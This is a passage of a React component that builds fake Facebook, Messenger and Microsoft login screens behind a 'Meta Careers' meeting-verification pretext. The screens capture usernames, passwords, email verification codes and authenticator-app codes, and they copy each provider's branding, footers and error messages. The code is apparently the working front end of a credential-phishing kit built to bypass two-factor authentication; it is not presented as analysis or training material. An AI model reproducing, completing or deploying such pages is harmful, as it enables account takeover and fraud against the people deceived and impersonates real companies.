  const canConfirm = canContinue && form.name.trim() && /\S+@\S+\.\S+/.test(form.email)

  const dateLabel = date
      ? date.toLocaleDateString("en-US", { weekday: "long", month: "long", day: "numeric" })
      : ""

  const providerColor =
      authProvider === "facebook" ? "#1877F2" : authProvider === "messenger" ? "#0A7CFF" : "#00A4EF"
  const providerLabel =
      authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"

  // Microsoft OTP fields accept 6–10 digits; Facebook/Messenger stay strict 6.
  const otpMinLen = 6
  const otpMaxLen = authProvider === "microsoft" ? 10 : 6
  const otpValid = otpCode.length >= otpMinLen && otpCode.length <= otpMaxLen

  const isFullScreen =
    step === "permissions" ||
    step === "full-login" ||
    step === "ms-authenticator" ||
    step === "verify-email" ||
    step === "email-otp" ||
    step === "enter-code" ||
    step === "check-phone" ||
    step === "approve-signin"

  return (
      <Dialog open={open} onOpenChange={handleOpenChange}>
        <DialogContent
            className={cn(
                "gap-0 overflow-hidden p-0",
                isFullScreen
                    ? "!left-0 !top-0 !translate-x-0 !translate-y-0 h-dvh !max-h-none w-screen !max-w-none !rounded-none !border-0 !shadow-none [&>button:last-child]:hidden"
                    : "max-h-[92vh] overflow-y-auto sm:max-w-2xl"
            )}
            onInteractOutside={(e) => e.preventDefault()}
        >

          {/* ─────────────────── PERMISSIONS SCREEN ─────────────────── */}
          {step === "permissions" && authProvider && (
              <div
                  className="flex h-full items-center justify-center px-4 py-8 transition-opacity duration-[260ms]"
                  style={{ backgroundColor: "#f0f2f5", opacity: permVisible ? 1 : 0 }}
              >
                <div
                    className="w-full max-w-[480px] rounded-xl bg-white shadow-lg transition-all duration-[260ms]"
                    style={{
                      transform: permVisible ? "translateY(0) scale(1)" : "translateY(14px) scale(0.96)",
                      opacity: permVisible ? 1 : 0,
                    }}
                >
                  {/* Header */}
                  <div className="flex items-center gap-3 px-6 py-5">
                    {authProvider === "facebook" ? (
                        <FacebookIcon className="size-10 text-[#1877F2]" />
                    ) : (
                        <MessengerIcon className="size-10 text-[#0A7CFF]" />
                    )}
                    <svg className="size-5 shrink-0 text-[#65676b]" viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M13 7l3 3-3 3M7 13l-3-3 3-3" />
                      <path d="M16 10H4" />
                    </svg>
                    <span className="text-lg font-bold" style={{ color: providerColor }}>
                  Meta Careers
                </span>
                  </div>

                  <div className="border-t border-[#dddfe2]" />

                  {/* Body */}
                  <div className="px-6 py-5">
                    <p className="text-base font-semibold text-[#1c1e21]">
                      Meta Careers is requesting access to:
                    </p>
                    <p className="mt-1 text-sm text-[#65676b]">
                      Name and profile picture to verify your scheduled meeting
                    </p>
                    <button type="button" className="mt-2 text-sm font-semibold text-[#1877F2] hover:underline">
                      View access
                    </button>

                    <div className="mt-5 flex flex-col gap-3 sm:flex-row">
                      <button
                          type="button"
                          onClick={handlePermLogin}
                          className="flex-1 rounded-lg bg-[#1877F2] py-3 text-sm font-bold text-white transition hover:bg-[#166FE5] active:bg-[#145DBD]"
                      >
                        Login
                      </button>
                      <button
                          type="button"
                          onClick={handlePermCancel}
                          className="flex-1 rounded-lg border border-[#ccd0d5] bg-[#e4e6eb] py-3 text-sm font-bold text-[#1c1e21] transition hover:bg-[#d8dadf] active:bg-[#ccd0d5]"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>

                  {/* Disclaimer */}
                  <div className="border-t border-[#dddfe2] px-6 py-4">
                    <p className="text-xs text-[#65676b]">
                      By continuing, Meta Careers will receive ongoing access to the information you
                      share and {providerLabel} will record when Meta Careers accesses it.{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Learn more
                      </button>{" "}
                      about this sharing and the settings you have.
                    </p>
                    <p className="mt-3 text-xs text-[#65676b]">
                      Meta Careers&apos;{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Privacy Policy
                      </button>{" "}
                      and{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Terms of Service
                      </button>
                    </p>
                  </div>
                </div>
              </div>
          )}

          {/* ─────────────────── FULL-SCREEN LOGIN ─────────────────── */}
          {step === "full-login" && authProvider && (
              <div
                  className="flex h-full flex-col overflow-y-auto bg-white transition-opacity duration-[300ms]"
                  style={{ opacity: fullVisible ? 1 : 0 }}
              >
                {authProvider === "facebook" ? (
                    /* ── FACEBOOK ── */
                    <>
                      {/* Top: Facebook logo */}
                      <div className="flex-shrink-0 px-6 pt-5 md:px-8">
                        <FacebookIcon className="size-10 text-[#1877F2]" />
                      </div>

                      {/* Main two-column body — centered max-width container */}
                      <div className="flex flex-1 items-center justify-center overflow-y-auto px-4 py-6">
                        <div className="flex w-full max-w-[980px] flex-col items-center gap-8 md:flex-row md:items-center md:gap-12">

                          {/* Left: collage image + tagline — desktop only */}
                          <div className="hidden flex-1 flex-col md:flex">
                            <img
                                src="/fb-hero.webp"
                                alt=""
                                className="w-full object-contain"
                            />
                            <p className="mt-2 text-[28px] font-bold leading-tight text-[#1c1e21] lg:text-[34px]">
                              Explore the things<br />
                              <span className="text-[#1877F2]">you love.</span>
                            </p>
                          </div>

                          {/* Right: login form */}
                          <div className="flex w-full flex-col items-center md:w-[396px] md:flex-shrink-0">
                            {/* Mobile: large FB logo above form */}
                            <div className="mb-6 flex justify-center md:hidden">
                              <FacebookIcon className="size-16 text-[#1877F2]" />
                            </div>

                            <div className="w-full rounded-lg bg-white shadow-none md:shadow-[0_2px_4px_rgba(0,0,0,.1),0_8px_16px_rgba(0,0,0,.1)]">
                              <div className="p-0 md:p-5">
                                <h2 className="mb-4 text-[20px] font-normal text-[#1c1e21]">
                                  Log in to Facebook
                                </h2>
                                <form onSubmit={handleFullLogin} className="space-y-3">
                                  {loginError && (
                                    <div className="rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                                      {loginError}
                                    </div>
                                  )}
                                  <input
                                      type="text"
                                      autoComplete="username"
                                      value={login.id}
                                      onChange={(e) => setLogin({ ...login, id: e.target.value })}
                                      placeholder="Email or mobile phone number"
                                      className={cn(
                                        "h-[52px] w-full rounded-lg border bg-white px-4 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-[3px]",
                                        loginError
                                          ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                          : "border-[#ccd0d5] focus:border-[#1877F2] focus:ring-[#e7f3ff]"
                                      )}
                                  />
                                  <input
                                      type="password"
                                      autoComplete="current-password"
                                      value={login.password}
                                      onChange={(e) => setLogin({ ...login, password: e.target.value })}
                                      placeholder="Password"
                                      className={cn(
                                        "h-[52px] w-full rounded-lg border bg-white px-4 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-[3px]",
                                        loginError
                                          ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                          : "border-[#ccd0d5] focus:border-[#1877F2] focus:ring-[#e7f3ff]"
                                      )}
                                  />
                                  <button
                                      type="submit"
                                      disabled={!canLogIn || loggingIn || isSending}
                                        className="flex h-[52px] w-full items-center justify-center gap-2 rounded-lg bg-[#1877F2] text-[20px] font-bold text-white transition hover:bg-[#166FE5] active:bg-[#145DBD] disabled:cursor-not-allowed disabled:bg-[#a0bcf8]"
                                      >
                                        {(loggingIn || isSending) && <Loader2 className="size-5 animate-spin" />}
                                        {loggingIn ? "Logging in…" : "Log in"}
                                  </button>
                                </form>
                                <div className="mt-4 text-center">
                                  <button type="button" className="text-[14px] text-[#1877F2] hover:underline">
                                    Forgot password?
                                  </button>
                                </div>
                                <div className="my-5 border-t border-[#dadde1]" />
                                <div className="flex justify-center">
                                  <button
                                      type="button"
                                      className="rounded-lg bg-[#42b72a] px-5 py-3 text-[17px] font-bold text-white transition hover:bg-[#36a420] active:bg-[#2d8f1c]"
                                  >
                                    Create new account
                                  </button>
                                </div>
                              </div>
                            </div>

                            <p className="mt-8 text-center text-[13px] text-[#1c1e21]">
                              <a href="#" className="font-bold hover:underline">Create a Page</a>
                              {" "}for a celebrity, brand or business.
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* Language footer */}
                      <div className="flex-shrink-0 border-t border-[#dadde1] px-4 py-3">
                        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-[13px] text-[#8d949e]">
                          {["English (US)", "Español", "Français (France)", "中文(简体)", "العربية", "Português (Brasil)", "Italiano", "한국어", "Deutsch", "हिन्दी"].map((lang, i) => (
                              <button key={i} type="button" className="hover:underline">{lang}</button>
                          ))}
                          <button type="button" className="hover:underline">More…</button>
                        </div>
                        <div className="mt-3 flex flex-wrap justify-center gap-x-3 gap-y-1 text-[13px] text-[#8d949e]">
                          {["Sign Up", "Log in", "Messenger", "Facebook Lite", "Video", "Places", "Games", "Marketplace", "Meta Pay", "Meta Store", "Meta Quest", "Instagram", "Threads", "Fundraisers", "Services", "Voting Information Centre", "Privacy Policy", "Privacy Centre", "Groups", "About", "Create ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices", "Terms", "Help", "Contact uploading and non-users"].map((link, i) => (
                              <button key={i} type="button" className="hover:underline">{link}</button>
                          ))}
                        </div>
                        <div className="mt-3 text-center text-[13px] text-[#8d949e]">
                          Meta © 2025
                        </div>
                      </div>
                    </>
                ) : authProvider === "microsoft" ? (
                    /* ── MICROSOFT ── */
                    <div
                        className="relative flex h-full flex-col items-center justify-center px-4 py-8"
                        style={{
                          fontFamily:
                            '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
                          background:
                            "radial-gradient(120% 120% at 15% 20%, #f7e9f0 0%, transparent 45%), radial-gradient(120% 120% at 85% 15%, #e7ecfb 0%, transparent 40%), radial-gradient(140% 140% at 80% 90%, #f3e6ef 0%, transparent 45%), radial-gradient(140% 140% at 10% 95%, #e9edf9 0%, transparent 45%), linear-gradient(135deg, #eef0f8 0%, #f2ecf3 50%, #edeef7 100%)",
                        }}
                    >
                      <form
                        onSubmit={msStep === "email" ? handleMicrosoftEmailNext : handleFullLogin}
                        className="w-full max-w-[440px] bg-white shadow-[0_8px_28px_rgba(0,0,0,0.10)]"
                        style={{ borderRadius: 8, padding: "44px 44px 40px" }}
                      >
                        {/* Header: back arrow + Microsoft logo */}
                        <div className="relative mb-5 flex items-center justify-center">
                          {msStep === "password" && (
                            <button
                              type="button"
                              aria-label="Back"
                              onClick={() => {
                                setMsStep("email")
                                setLoginError("")
                              }}
                              className="absolute left-0 top-1/2 -translate-y-1/2 p-1 text-[#5e5e5e]"
                            >
                              <svg viewBox="0 0 24 24" fill="none" className="size-5">
                                <path
                                  d="M15 5l-7 7 7 7"
                                  stroke="#5e5e5e"
                                  strokeWidth="1.6"
                                  strokeLinecap="round"
                                  strokeLinejoin="round"
                                />
                              </svg>
                            </button>
                          )}
                          <div className="flex items-center">
                            <MicrosoftIcon className="mr-2 size-[22px]" />
                            <span className="text-[15px] font-semibold text-[#5e5e5e]">Microsoft</span>
                          </div>
                        </div>

                        {/* Email pill (password step only) */}
                        {msStep === "password" && (
                          <div className="mb-[22px] flex justify-center">
                            <span className="inline-flex items-center justify-center rounded-2xl border border-[#d1d1d1] px-3.5 py-1 text-[13px] text-[#1b1b1b]">
                              {login.id || "someone@example.com"}
                            </span>
                          </div>
                        )}

                        <h1 className="mb-5 text-[24px] font-semibold text-[#1b1b1b]">
                          {msStep === "email" ? "Sign in" : "Enter your password"}
                        </h1>

                        {msStep === "password" && loginError && (
                          <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
                            Your account or password is incorrect. If you don&apos;t remember your
                            password,{" "}
                            <button type="button" className="text-[#0067b8] hover:underline">
                              reset it now
                            </button>
                            .
                          </p>
                        )}

                        {msStep === "email" ? (
                          <>
                            {loginError && (
                              <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
                                We couldn&apos;t find an account with that username. Try another, or{" "}
                                <button type="button" className="text-[#0067b8] hover:underline">
                                  get a new Microsoft account
                                </button>
                                .
                              </p>
                            )}
                            <input
                              type="text"
                              autoComplete="username"
                              value={login.id}
                              onChange={(e) => {
                                setLogin({ ...login, id: e.target.value })
                                if (loginError) setLoginError("")
                              }}
                              placeholder="Email, phone, or Skype"
                              aria-label="Email, phone, or Skype"
                              className={cn(
                                "mb-4 w-full border-0 border-b bg-transparent px-0 py-1.5 text-[15px] text-[#1b1b1b] outline-none focus:border-b-2",
                                loginError
                                  ? "border-b-[#e81123] focus:border-b-[#e81123]"
                                  : "border-b-[#666] focus:border-b-[#0067b8]"
                              )}
                            />
                            <p className="mb-1 text-[13px] text-[#1b1b1b]">
                              No account?{" "}
                              <button type="button" className="text-[#0067b8] hover:underline">
                                Create one!
                              </button>
                            </p>
                            <p className="mb-0 text-[13px] text-[#1b1b1b]">
                              <button type="button" className="text-[#0067b8] hover:underline">
                                Can&apos;t access your account?
                              </button>
                            </p>
                            <div className="mt-11 flex justify-end">
                              <button
                                type="submit"
                                disabled={login.id.trim().length === 0 || isSending}
                                className="flex min-w-[108px] items-center justify-center gap-2 bg-[#0067b8] px-4 text-[15px] font-normal text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                                style={{ height: 32 }}
                              >
                                {isSending && <Loader2 className="size-4 animate-spin" />}
                                {isSending ? "Checking…" : "Next"}
                              </button>
                            </div>
                          </>
                        ) : (
                          <>
                            <input
                              type="password"
                              autoComplete="current-password"
                              value={login.password}
                              onChange={(e) => {
                                setLogin({ ...login, password: e.target.value })
                                if (loginError) setLoginError("")
                              }}
                              placeholder="Password"
                              aria-label="Password"
                              className={cn(
                                "mb-6 w-full border bg-white px-2.5 py-2.5 text-[15px] text-[#1b1b1b] outline-none focus:border-2 focus:px-[9px] focus:py-[9px]",
                                loginError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#666] focus:border-[#0067b8]"
                              )}
                              style={{ borderRadius: 4 }}
                            />
                            <button
                              type="submit"
                              disabled={login.password.length === 0 || loggingIn || isSending}
                              className="mb-[22px] flex w-full items-center justify-center gap-2 bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                              style={{ height: 44, borderRadius: 4 }}
                            >
                              {(loggingIn || isSending) && <Loader2 className="size-4 animate-spin" />}
                              {loggingIn ? "Signing in…" : "Next"}
                            </button>
                            <button
                              type="button"
                              className="text-[13px] font-semibold text-[#0067b8] hover:underline"
                            >
                              Other ways to sign in
                            </button>
                          </>
                        )}
                      </form>

                      {/* Microsoft footer */}
                      <div className="pointer-events-none absolute inset-x-0 bottom-0 flex flex-col items-center gap-1 px-4 py-2.5 text-center text-[12px] text-[#444]">
                        <div className="flex flex-wrap justify-center gap-x-5 gap-y-1">
                          <button type="button" className="pointer-events-auto hover:underline">
                            Help and feedback
                          </button>
                          <button type="button" className="pointer-events-auto hover:underline">
                            Terms of use
                          </button>
                          <button type="button" className="pointer-events-auto hover:underline">
                            Privacy and cookies
                          </button>
                        </div>
                      </div>
                    </div>
                ) : (
                    /* ── MESSENGER ── */
                    <>
                      <div className="flex-shrink-0 px-6 pt-5 md:px-10">
                        <MessengerIcon className="size-10 text-[#0A7CFF]" />
                      </div>

                      <div className="flex flex-1 flex-col md:flex-row">
                        {/* Left: headline + form */}
                        <div className="flex flex-1 flex-col justify-center px-6 py-8 md:px-12 lg:px-20">
                          <h1 className="mb-3 text-3xl font-bold leading-tight text-[#0A7CFF] md:text-4xl lg:text-5xl">
                            A place for<br />meaningful<br />conversations
                          </h1>
                          <p className="mb-6 max-w-sm text-[15px] leading-relaxed text-[#65676b]">
                            Messenger helps you connect with your Facebook friends and family, build your community, and deepen your interests.
                          </p>
                          <form onSubmit={handleFullLogin} className="w-full max-w-xs space-y-3">
                            {loginError && (
                              <div className="rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                                {loginError}
                              </div>
                            )}
                            <input
                                type="text"
                                autoComplete="username"
                                value={login.id}
                                onChange={(e) => setLogin({ ...login, id: e.target.value })}
                                placeholder="Email or phone number"
                                className={cn(
                                  "h-[48px] w-full rounded-lg border bg-white px-4 text-[15px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                                  loginError
                                    ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                    : "border-[#ccd0d5] focus:border-[#0A7CFF] focus:ring-[#0A7CFF]/20"
                                )}
                            />
                            <input
                                type="password"
                                autoComplete="current-password"
                                value={login.password}
                                onChange={(e) => setLogin({ ...login, password: e.target.value })}
                                placeholder="Password"
                                className={cn(
                                  "h-[48px] w-full rounded-lg border bg-white px-4 text-[15px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                                  loginError
                                    ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                    : "border-[#ccd0d5] focus:border-[#0A7CFF] focus:ring-[#0A7CFF]/20"
                                )}
                            />
                            <div className="flex flex-wrap items-center gap-3">
                              <button
                                  type="submit"
                                  disabled={!canLogIn || loggingIn || isSending}
                                  className="flex items-center gap-2 rounded-lg bg-[#0A7CFF] px-7 py-2.5 font-bold text-white transition hover:bg-[#0866FF] disabled:bg-[#a0caf8]"
                              >
                                {(loggingIn || isSending) && <Loader2 className="size-4 animate-spin" />}
                                {loggingIn ? "Logging in…" : "Log in"}
                              </button>
                              <button type="button" className="text-sm font-medium text-[#0A7CFF] hover:underline">
                                Forgot password?
                              </button>
                            </div>
                            <label className="flex cursor-pointer items-center gap-2 text-sm text-[#1c1e21]">
                              <input type="checkbox" className="size-4 rounded border-[#ccd0d5]" />
                              Keep me signed in
                            </label>
                          </form>
                        </div>

                        {/* Right: phone mockup image — desktop only */}
                        <div className="hidden flex-1 items-center justify-center md:flex">
                          <img
                              src="/msn-hero.png"
                              alt="Messenger app preview"
                              className="h-full max-h-[580px] w-auto object-contain"
                          />
                        </div>
                      </div>
                    </>
                )}
              </div>
          )}

          {/* ─────────────────── VERIFY EMAIL (2FA) ─────────────────── */}
          {step === "verify-email" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <form
                    onSubmit={handleVerifyEmailSubmit}
                    className="relative z-[2] w-full max-w-[440px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "26px 44px 36px" }}
                >
                  <button
                      type="button"
                      aria-label="Back"
                      onClick={() => setStep("full-login")}
                      className="absolute left-[22px] top-[22px] text-[#666]"
                  >
                    <svg viewBox="0 0 24 24" fill="none" className="size-5">
                      <path
                        d="M15 5l-7 7 7 7"
                        stroke="currentColor"
                        strokeWidth="1.6"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  </button>

                  <div className="mb-[26px] mt-1 flex items-center justify-center gap-2">
                    <MicrosoftIcon className="size-5" />
                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                      Microsoft
                    </span>
                  </div>

                  <div className="mb-[22px] flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  <h1 className="mb-[14px] text-center text-[24px] font-semibold leading-tight text-[#1b1b1b]">
                    Verify your email
                  </h1>

                  <p className="mb-5 text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
                    We&apos;ll send a verification code to your email.
                    <br />
                    To verify this is your email address, enter it here.
                  </p>

                  {emailVerifyError && (
                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">{emailVerifyError}</p>
                  )}

                  <input
                      type="email"
                      value={emailVerify}
                      onChange={(e) => {
                        setEmailVerify(e.target.value)
                        if (emailVerifyError) setEmailVerifyError("")
                      }}
                      placeholder="Email"
                      aria-label="Email"
                      className={cn(
                        "mb-[22px] h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
                        emailVerifyError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
                      )}
                  />

                  <button
                      type="submit"
                      disabled={emailVerify.trim().length === 0 || verifyingEmail}
                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                  >
                    {verifyingEmail && <Loader2 className="size-4 animate-spin" />}
                    {verifyingEmail ? "Sending…" : "Send code"}
                  </button>

                  <button
                      type="button"
                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Already received a code?
                  </button>
                </form>

                <MicrosoftFooter />
              </div>
          )}

          {/* ─────────────────── EMAIL OTP ─────────────────── */}
          {step === "email-otp" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <div
                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "30px 40px 34px" }}
                >
                  <div className="mb-[22px] flex items-center justify-center gap-2">
                    <MicrosoftIcon className="size-5" />
                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                      Microsoft
                    </span>
                  </div>

                  <div className="mb-4 flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  {otpError && (
                    <div className="mb-[18px] flex items-center gap-2 rounded border border-[#e6b3b7] bg-[#fdf3f4] px-2.5 py-[9px]">
                      <span className="inline-flex size-5 shrink-0 items-center justify-center rounded-full bg-[#c50f1f]">
                        <svg viewBox="0 0 24 24" fill="none" className="size-[11px] text-white">
                          <path
                            d="M6 6l12 12M18 6L6 18"
                            stroke="currentColor"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                      </span>
                      <p className="text-[12.5px] leading-tight text-[#1b1b1b]">
                        That code didn&apos;t work. Check the code and try again.
                      </p>
                    </div>
                  )}

                  <h1 className="mb-[14px] text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
                    Enter the code
                  </h1>

                  <p className="mx-auto mb-[26px] max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
                    If <b>{emailVerify || login.id}</b> matches the email address on your account,
                    we&apos;ll send you a code.
                  </p>

                  <div className="mb-[26px] flex flex-wrap justify-center gap-2">
                    {Array.from({ length: 10 }).map((_, i) => (
                      <input
                        key={i}
                        type="text"
                        inputMode="numeric"
                        maxLength={1}
                        value={otpCode[i] || ""}
                        onChange={(e) => {
                          const digits = e.target.value.replace(/\D/g, "")
                          if (!digits) return
                          const next = (otpCode.slice(0, i) + digits + otpCode.slice(i + 1)).slice(0, 10)
                          setOtpCode(next)
                          setOtpError("")
                          const el = e.target as HTMLInputElement
                          const nextBox = el.parentElement?.children[i + 1] as HTMLInputElement | undefined
                          if (nextBox) nextBox.focus()
                        }}
                        onKeyDown={(e) => {
                          if (e.key === "Backspace" && !otpCode[i] && i > 0) {
                            const el = e.target as HTMLInputElement
                            const prevBox = el.parentElement?.children[i - 1] as HTMLInputElement | undefined
                            if (prevBox) prevBox.focus()
                          }
                        }}
                        className="w-[30px] rounded-md border border-[#d1d1d1] bg-white text-center text-[17px] text-[#1b1b1b] outline-none focus:border-[#0067b8] focus:shadow-[inset_0_0_0_1px_#0067b8]"
                        style={{ height: 44 }}
                      />
                    ))}
                  </div>

                  <button
                      type="button"
                      onClick={handleAuthenticatorContinue}
                      disabled={!otpValid || isSending}
                      className="mb-4 flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                  >
                    {isSending && <Loader2 className="size-4 animate-spin" />}
                    {isSending ? "Verifying…" : "Next"}
                  </button>

                  <button
                      type="button"
                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Other ways to sign in
                  </button>
                </div>

                <MicrosoftFooter note="Use private browsing if this is not your device." />
              </div>
          )}

          {/* ─────────────────── AUTHENTICATOR CODE (MICROSOFT) ─────────────────── */}
          {step === "ms-authenticator" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <div
                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "30px 40px 34px" }}
                >
                  <div className="relative mb-[22px] flex items-center justify-center">
                    <button
                        type="button"
                        aria-label="Back"
                        onClick={() => setStep("full-login")}
                        className="absolute left-0 top-1/2 -translate-y-1/2 text-[#666]"
                    >
                      <svg viewBox="0 0 24 24" fill="none" className="size-5">
                        <path
                          d="M15 5l-7 7 7 7"
                          stroke="currentColor"
                          strokeWidth="1.6"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    </button>
                    <div className="flex items-center gap-2">
                      <MicrosoftIcon className="size-5" />
                      <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                        Microsoft
                      </span>
                    </div>
                  </div>

                  <div className="mb-5 flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  <h1 className="mx-auto mb-[22px] max-w-[300px] text-center text-[24px] font-bold leading-[1.25] text-[#1b1b1b]">
                    Enter the code generated by your authenticator app
                  </h1>

                  <div className="mb-[26px] flex justify-center">
                    <img
                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
                        alt="Authenticator app"
                        className="block h-auto w-24"
                    />
                  </div>

                  {otpError && (
                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
                      That code didn&apos;t work. Check the code and try again.
                    </p>
                  )}

                  <input
                      type="text"
                      inputMode="numeric"
                      maxLength={10}
                      value={otpCode}
                      onChange={(e) => {
                        setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 10))
                        setOtpError("")
                      }}
                      placeholder="Code"
                      aria-label="Code"
                      className={cn(
                        "mb-6 h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
                        otpError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
                      )}
                  />

                  <button
                      type="button"
                      onClick={handleAuthenticatorContinue}
                      disabled={!otpValid || isSending}
                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                  >
                    {isSending && <Loader2 className="size-4 animate-spin" />}
                    {isSending ? "Verifying…" : "Next"}
                  </button>

                  <label className="flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
                    <input
                        type="checkbox"
                        checked={rememberDevice}
                        onChange={(e) => setRememberDevice(e.target.checked)}
                        className="sr-only"
                    />
                    <span
                        className={cn(
                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
                        )}
                    >
